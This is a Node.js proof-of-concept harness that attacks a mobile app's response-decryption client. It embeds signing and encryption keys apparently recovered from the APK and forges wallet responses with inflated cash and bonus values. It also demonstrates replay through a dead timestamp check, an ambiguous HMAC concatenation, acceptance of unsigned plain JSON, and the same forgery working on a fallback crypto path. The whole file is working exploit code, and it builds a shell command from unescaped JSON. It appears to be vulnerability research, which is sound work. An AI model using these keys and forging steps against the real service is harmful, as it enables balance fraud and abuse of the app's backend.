// Runs the APK's ACTUAL ResponseDecryptClient against attacker-forged traffic.
const { execSync } = require('child_process');
const { RD } = require('./loader.js');

const P_K  = 'rbK2RR#PFn7H4vu0!EKaElnWQkOcKU_z';
const P_AK = 'j39qexkacw7gtnzrnnlwuibjnd494xhw';

function forge(pyObj) {
  return JSON.parse(execSync(`python3 forge.py '${JSON.stringify(pyObj)}'`,
    { cwd: __dirname, encoding: 'utf8' }));
}
const client = () => new RD.ResponseDecryptClient({ k: P_K, ak: P_AK, timestampTtl: 300 });

let pass = 0, fail = 0;
function check(name, cond, extra = '') {
  if (cond) { pass++; console.log(`  \x1b[32mPASS\x1b[0m  ${name} ${extra}`); }
  else      { fail++; console.log(`  \x1b[31mFAIL\x1b[0m  ${name} ${extra}`); }
}

(async () => {
  console.log('=== 0. Sanity: is validateTimestamp ever invoked by decryptResponse? ===');
  const src = require('fs').readFileSync(__dirname + '/response-decrypt.js', 'utf8');
  const defn = (src.match(/validateTimestamp/g) || []).length;
  const calls = (src.match(/this\.validateTimestamp\s*\(/g) || []).length;
  console.log(`  "validateTimestamp" appears ${defn}x, called via this. ${calls}x`);
  check('TTL check is DEAD CODE (never called) -> unlimited replay window', calls === 0);

  console.log('\n=== 1. Forge a wallet response using ONLY the recovered APK keys ===');
  const forged = forge({ code: 0, cash: 999999, bonus: 888888, msg: 'forged' });
  const c = client();
  const out = await c.decryptResponse(forged);
  check('forged envelope passes signature verification', true);
  check('forged plaintext decrypts correctly', out.cash === 999999 && out.bonus === 888888,
        `-> ${JSON.stringify(out)}`);

  console.log('\n=== 2. Signature canonicalisation is ambiguous (data + ts, no separator) ===');
  // (data="abc", ts=123) and (data="abc1", ts=23) must hash identically
  const { createHmac } = require('crypto');
  const h = (d, t) => createHmac('sha256', P_K).update(d + String(t)).digest('hex');
  const s1 = h('abc', 123), s2 = h('abc1', 23);
  check('HMAC("abc",123) === HMAC("abc1",23)', s1 === s2, `-> ${s1.slice(0, 24)}...`);

  console.log('\n=== 3. Encryption is opt-out: plain JSON is accepted with NO verification ===');
  const plain = { code: 0, cash: 12345678, bonus: 0, msg: 'no envelope at all' };
  check('isEncryptedResponse(plain) === false', RD.isEncryptedResponse(plain) === false);
  const echoed = await client().decryptResponse(plain);
  check('plain JSON returned to business logic untouched', echoed.cash === 12345678,
        `-> cash=${echoed.cash}`);

  console.log('\n=== 4. Replay: same envelope accepted indefinitely ===');
  const r = client();
  const a1 = await r.decryptResponse(forged);
  await new Promise(s => setTimeout(s, 1100));
  const a2 = await r.decryptResponse(forged);
  check('identical envelope accepted twice (and 1s later)', a1.msg === a2.msg);

  console.log('\n=== 5. Is each integrity layer actually working? ===');
  // 5a. flip a ciphertext byte, keep the ORIGINAL signature -> HMAC layer must catch it
  const t = forge({ code: 0, msg: 'original' });
  const raw = Buffer.from(t.data, 'base64');
  raw[20] ^= 0x01;
  const tamperedData = raw.toString('base64');
  let e5a = null;
  try { await client().decryptResponse({ ...t, data: tamperedData }); } catch (e) { e5a = e.message; }
  check('5a. flipped byte caught by HMAC layer', /签名验证失败/.test(e5a || ''), `-> ${e5a}`);

  // 5b. flip a ciphertext byte AND re-sign with the stolen key -> only the GCM tag can catch it
  const resign = (d, ts) => createHmac('sha256', P_K).update(d + String(ts)).digest('hex');
  let e5b = null;
  try { await client().decryptResponse({ ...t, data: tamperedData, signature: resign(tamperedData, t.timestamp) }); }
  catch (e) { e5b = e.message; }
  check('5b. re-signed tamper caught by GCM tag', /tag|Tag|解密失败/.test(e5b || ''), `-> ${e5b}`);
  check('5c. => primitives are sound; the flaw is key management, not the cipher',
        !!e5a && !!e5b);

  console.log('\n=== 6. Same attack works on the CryptoJS fallback path (no WebCrypto) ===');
  const savedSubtle = globalThis.crypto.subtle;
  Object.defineProperty(globalThis.crypto, 'subtle', { value: undefined, configurable: true });
  const fb = client();
  check('useNativeCrypto() now false', fb.useNativeCrypto() === false);
  const fbOut = await fb.decryptResponse(forge({ code: 0, cash: 555, msg: 'fallback' }));
  check('forged envelope accepted via CryptoJS fallback too', fbOut.cash === 555,
        `-> ${JSON.stringify(fbOut)}`);
  Object.defineProperty(globalThis.crypto, 'subtle', { value: savedSubtle, configurable: true });

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
})().catch(e => { console.error('HARNESS ERROR', e); process.exit(2); });
